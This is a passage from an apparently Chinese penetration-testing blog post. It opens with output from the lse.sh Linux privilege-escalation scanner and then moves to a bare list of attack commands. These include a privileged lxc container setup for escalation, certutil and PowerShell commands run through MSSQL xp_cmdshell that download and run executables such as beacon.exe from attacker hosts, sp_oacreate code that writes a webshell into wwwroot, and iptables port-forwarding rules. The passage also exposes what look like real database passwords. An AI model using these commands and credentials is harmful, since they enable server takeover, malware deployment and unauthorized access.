yes!<br>[!] fst020 Uncommon setuid binaries…………………………………. yes!</p>
+<hr>
+<p>/snap/snapd/17029/usr/lib/snapd/snap-confine<br>/snap/snapd/17336/usr/lib/snapd/snap-confine</p>
+<hr>
+<p>[!] fst030 Can we write to any setuid binary?………………………… nope<br>[<em>] fst040 Binaries with setgid bit…………………………………. skip<br>[!] fst050 Uncommon setgid binaries…………………………………. skip<br>[!] fst060 Can we write to any setgid binary?………………………… skip<br>[</em>] fst070 Can we read /root?………………………………………. nope<br>[<em>] fst080 Can we read subdirectories under /home?……………………. nope<br>[</em>] fst090 SSH files in home directories…………………………….. nope<br>[<em>] fst100 Useful binaries…………………………………………. yes!<br>[</em>] fst110 Other interesting files in home directories………………… nope<br>[!] fst120 Are there any credentials in fstab/mtab?…………………… nope<br>[<em>] fst130 Does ‘acequan’ have mail?………………………………… nope<br>[!] fst140 Can we access other users mail?…………………………… nope<br>[</em>] fst150 Looking for GIT/SVN repositories………………………….. nope<br>[!] fst160 Can we write to critical files?…………………………… nope<br>[!] fst170 Can we write to critical directories?……………………… nope<br>[!] fst180 Can we write to directories from PATH defined in /etc?………. nope<br>[!] fst190 Can we read any backup?………………………………….. yes!</p>
+<hr>
+<p>-rw-r—– 1 acequan acequan 35786 11月  8 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.3.zip<br>-rw-r—– 1 acequan acequan 35786 11月  9 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.2.zip<br>-rw-r—– 1 acequan acequan 35786 11月  5 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.6.zip<br>-rw-r—– 1 acequan acequan 35786 11月  7 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.4.zip<br>-rw-r—– 1 acequan acequan 35786 11月 11 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.0.zip<br>-rw-r—– 1 acequan acequan 35786 11月 10 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.1.zip<br>-rw-r—– 1 acequan acequan 35786 11月 12 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.zip<br>-rw-r—– 1 acequan acequan 35786 11月  6 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.5.zip</p>
+<hr>
+<p>[!] fst200 Are there possible credentials in any shell history file?……. nope<br>[!] fst210 Are there NFS exports with ‘no_root_squash’ option?…………. nope<br>[<em>] fst220 Are there NFS exports with ‘no_all_squash’ option?………….. nope<br>[i] fst500 Files owned by user ‘acequan’…………………………….. skip<br>[i] fst510 SSH files anywhere………………………………………. skip<br>[i] fst520 Check hosts.equiv file and its contents……………………. skip<br>[i] fst530 List NFS server shares…………………………………… skip<br>[i] fst540 Dump fstab file…………………………………………. skip<br>=================================================================( system )=====<br>[i] sys000 Who is logged in………………………………………… skip<br>[i] sys010 Last logged in users…………………………………….. skip<br>[!] sys020 Does the /etc/passwd have hashes?…………………………. nope<br>[!] sys022 Does the /etc/group have hashes?………………………….. nope<br>[!] sys030 Can we read shadow files?………………………………… nope<br>[</em>] sys040 Check for other superuser accounts………………………… nope<br>[<em>] sys050 Can root user log in via SSH?…………………………….. nope<br>[i] sys060 List available shells……………………………………. skip<br>[i] sys070 System umask in /etc/login.defs…………………………… skip<br>[i] sys080 System password policies in /etc/login.defs………………… skip<br>===============================================================( security )=====<br>[</em>] sec000 Is SELinux present?……………………………………… nope<br>[<em>] sec010 List files with capabilities……………………………… yes!<br>[!] sec020 Can we write to a binary with caps?……………………….. nope<br>[!] sec030 Do we have all caps in any binary?………………………… nope<br>[</em>] sec040 Users with associated capabilities………………………… nope<br>[!] sec050 Does current user have capabilities?………………………. skip<br>[!] sec060 Can we read the auditd log?………………………………. nope<br>========================================================( recurrent tasks )=====<br>[<em>] ret000 User crontab……………………………………………. nope<br>[!] ret010 Cron tasks writable by user………………………………. nope<br>[</em>] ret020 Cron jobs………………………………………………. yes!<br>[<em>] ret030 Can we read user crontabs………………………………… nope<br>[</em>] ret040 Can we list other user cron tasks?………………………… nope<br>[<em>] ret050 Can we write to any paths present in cron jobs……………… yes!<br>[!] ret060 Can we write to executable paths present in cron jobs……….. nope<br>[i] ret400 Cron files……………………………………………… skip<br>[</em>] ret500 User systemd timers……………………………………… nope<br>[!] ret510 Can we write in any system timer?…………………………. nope<br>[i] ret900 Systemd timers………………………………………….. skip<br>================================================================( network )=====<br>[<em>] net000 Services listening only on localhost………………………. yes!<br>[!] net010 Can we sniff traffic with tcpdump?………………………… nope<br>[i] net500 NIC and IP information…………………………………… skip<br>[i] net510 Routing table…………………………………………… skip<br>[i] net520 ARP table………………………………………………. skip<br>[i] net530 Nameservers…………………………………………….. skip<br>[i] net540 Systemd Nameservers……………………………………… skip<br>[i] net550 Listening TCP…………………………………………… skip<br>[i] net560 Listening UDP…………………………………………… skip<br>===============================================================( services )=====<br>[!] srv000 Can we write in service files?……………………………. nope<br>[!] srv010 Can we write in binaries executed by services?……………… nope<br>[</em>] srv020 Files in /etc/init.d/ not belonging to root………………… nope<br>[<em>] srv030 Files in /etc/rc.d/init.d not belonging to root…………….. nope<br>[</em>] srv040 Upstart files not belonging to root……………………….. nope<br>[<em>] srv050 Files in /usr/local/etc/rc.d not belonging to root………….. nope<br>[i] srv400 Contents of /etc/inetd.conf………………………………. skip<br>[i] srv410 Contents of /etc/xinetd.conf……………………………… skip<br>[i] srv420 List /etc/xinetd.d if used……………………………….. skip<br>[i] srv430 List /etc/init.d/ permissions…………………………….. skip<br>[i] srv440 List /etc/rc.d/init.d permissions…………………………. skip<br>[i] srv450 List /usr/local/etc/rc.d permissions………………………. skip<br>[i] srv460 List /etc/init/ permissions………………………………. skip<br>[!] srv500 Can we write in systemd service files?…………………….. nope<br>[!] srv510 Can we write in binaries executed by systemd services?………. nope<br>[</em>] srv520 Systemd files not belonging to root……………………….. nope<br>[i] srv900 Systemd config files permissions………………………….. skip<br>===============================================================( software )=====<br>[!] sof000 Can we connect to MySQL with root/root credentials?…………. nope<br>[!] sof010 Can we connect to MySQL as root without password?…………… nope<br>[!] sof015 Are there credentials in mysql_history file?……………….. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?….. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?….. nope<br>[*] sof030 Installed apache modules…………………………………. nope<br>[!] sof040 Found any .htpasswd files?……………………………….. nope<br>[!] sof050 Are there private keys in ssh-agent?………………………. nope<br>[!] sof060 Are there gpg keys cached in gpg-agent?……………………. nope<br>[!] sof070 Can we write to a ssh-agent socket?……………………….. nope</p>
+<h2 id="sof080-Can-we-write-to-a-gpg-agent-socket-………………………-yes"><a href="#sof080-Can-we-write-to-a-gpg-agent-socket-………………………-yes" class="headerlink" title="[!] sof080 Can we write to a gpg-agent socket?……………………….. yes!"></a>[!] sof080 Can we write to a gpg-agent socket?……………………….. yes!</h2><p>/run/user/1000/gnupg/S.gpg-agent<br>/run/user/1000/gnupg/S.gpg-agent.ssh<br>/run/user/1000/gnupg/S.gpg-agent.extra<br>/run/user/1000/gnupg/S.gpg-agent.browser</p>
+<hr>
+<p>[!] sof090 Found any keepass database files?…………………………. nope<br>[!] sof100 Found any ‘pass’ store directories?……………………….. nope<br>[!] sof110 Are there any tmux sessions available?…………………….. nope<br>[<em>] sof120 Are there any tmux sessions from other users?………………. nope<br>[!] sof130 Can we write to tmux session sockets from other users?………. nope<br>[!] sof140 Are any screen sessions available?………………………… nope<br>[</em>] sof150 Are there any screen sessions from other users?…………….. nope<br>[!] sof160 Can we write to screen session sockets from other users?…….. nope<br>[<em>] sof170 Can we access MongoDB databases without credentials?………… nope<br>[i] sof500 Sudo version……………………………………………. skip<br>[i] sof510 MySQL version…………………………………………… skip<br>[i] sof520 Postgres version………………………………………… skip<br>[i] sof530 Apache version………………………………………….. skip<br>[i] sof540 Tmux version……………………………………………. skip<br>[i] sof550 Screen version………………………………………….. skip<br>=============================================================( containers )=====<br>[</em>] ctn000 Are we in a docker container?…………………………….. nope<br>[<em>] ctn010 Is docker available?…………………………………….. nope<br>[!] ctn020 Is the user a member of the ‘docker’ group?………………… nope<br>[</em>] ctn200 Are we in a lxc container?……………………………….. nope<br>[!] ctn210 Is the user a member of any lxc/lxd group?…………………. yes!</p>
+<hr>
+<h2 id="acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare"><a href="#acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare" class="headerlink" title="acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare"></a>acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare</h2><p>==============================================================( processes )=====<br>[i] pro000 Waiting for the process monitor to finish………………….. yes!<br>[i] pro001 Retrieving process binaries………………………………. yes!<br>[i] pro002 Retrieving process users…………………………………. yes!<br>[!] pro010 Can we write in any process binary?……………………….. nope<br>[<em>] pro020 Processes running with root permissions……………………. yes!<br>[</em>] pro030 Processes running by non-root users with shell……………… yes!<br>[i] pro500 Running processes……………………………………….. skip<br>[i] pro510 Running process binaries and permissions…………………… skip<br>===================================================================( CVEs )=====<br>In order to test for CVEs, download lse.sh from the GitHub releases page.<br>Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the repository.</p>
+<p>==================================( FINISHED )==================================<br>$ lxc init ubuntu: ignite -c security.privileged=true</p>
+<p>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.144.129/beacon.exe">http://192.168.144.129/beacon.exe</a> C:\xxx.exe</p>
+<p>iptables -A PREROUTING -p tcp -d 192.168.111.131 –dport 822 -j DNAT –to-destination 192.168.1.88:8080</p>
+<p>iptables -A POSTROUTING -p tcp -d 192.168.1.88 –dport 8080 -j SNAT –to-source 192.168.111.131</p>
+<p>define(‘DB_HOST’, ‘localhost’); //数据库服务器地址<br>define(‘DB_USER’, ‘fk_huoxingtu_cn’);  //数据库用户名<br>define(‘DB_PWD’, ‘haK6eF4jxw3YKDEW’);//数据库密码<br>define(‘DB_NAME’, ‘fk_huoxingtu_cn’);  //数据库名称<br>define(‘DB_PORT’, ‘3306’);  //数据库端口</p>
+<p>define(‘IN_DBHOST’, ‘127.0.0.1’);<br>define(‘IN_DBUSER’, ‘fenfa’);<br>define(‘IN_DBPW’, ‘yEAnzRb6dMMBtZ47’);<br>define(‘IN_DBNAME’, ‘fenfa’);</p>
+<p>execute master..xp_dirtree ‘c:’,1,1</p>
+<p>exec master..xp_cmdshell ‘net user’ ;<br>bitsadmin /transfer n <a target="_blank" rel="noopener" href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> c:a.txt<br>c:\users\Administrator\desktop\a.txt</p>
+<p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:\inetpub\wwwroot\s.jsp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,’&lt;%execute(request(“a”))%&gt;’</p>
+<p>exec master..xp_cmdshell ‘“echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(“<a target="_blank" rel="noopener" href="http://example/test0.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create “%TEMP%\test.exe””‘</p>
+<p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘C:\inetpub\wwwroot\s.jsp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,’&lt;%execute(request(“a”))%&gt;’<br>exec master..xp_cmdshell ‘dir c:\inetpub\wwwroot&#39; ;</p>
+<p>exec master..xp_cmdshell ‘“echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(“<a target="_blank" rel="noopener" href="http://ip/chunqiu.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://ip/chunqiu.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create “%TEMP%\test.exe””‘</p>
+<p>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://ip/chunqiu.exe">http://ip/chunqiu.exe</a> c:\a.exe</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2023/11/17/cfs/cfs/">https://bohemian.top/2023/11/17/cfs/cfs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/others/xingkong.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/" title="NewStarCTF2023公开赛道WEEK2"><img class="cover" src="/images/xinshengsai/image-20231108103248287.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">NewStarCTF2023公开赛道WEEK2</div></div><div class="info-2"><div class="info-item-1">NewStarCTF 2023 公开赛道 WEEK2REVERSEWEEK2|REVERSE PZthon 下载文件，看起来像是py文件，py文件的话拖ida是不行的，至于为什么不行，我也不知道，大佬说的，  拖到ida里，也不行，太多东西了。 https://github.com/extremecoders-re/pyinstxtractor 可以使用这个python exe 反编译工具进行反编译， python3 .\pyinstxtractor.py...</div></div></div></a><a class="pagination-related" href="/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/" title="sqlserver上线csormsf"><img class="cover" src="/images/my2021/xingkong.jpeg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">sqlserver上线csormsf</div></div><div class="info-2"><div class="info-item-1">当我没拿到一个sqlserver的权限时，权限很小，且有waf的情况下，且只能透过web执行命令，上线到msf或者cs。  先看一下杀软  很多，还有国外的。 这里采用mshta免杀上线，参考文章https://www.zhihuifly.com/t/topic/2534 首先整个模板文件https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta，在这个里， 然后使用cs 或者msf生成一个raw 文件 msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.211.55.2 LPORT=3333 -f raw -o payload.bin cs  attacks  这里注意是32位的 然后cat payload.bin | base64 -w 0  把得到的内容写进模板里  然后起一个python服务器即可， msf的要起监听 use exploit/multi/handler payload...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#lse-sh"><span class="toc-number">1.</span> <span class="toc-text">$ .&#x2F;lse.sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges"><span class="toc-number">2.</span> <span class="toc-text">If you know the current user password, write it here to check sudo privileges:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sof080-Can-we-write-to-a-gpg-agent-socket-%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6-yes"><span class="toc-number">3.</span> <span class="toc-text">[!] sof080 Can we write to a gpg-agent socket?……………………….. yes!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare"><span class="toc-number">4.</span> <span class="toc-text">acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)">哥斯拉二开从0到1-2(免杀)</a><time datetime="2024-11-18T01:55:05.000Z" title="发表于 2024-11-18 09:55:05">2024-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
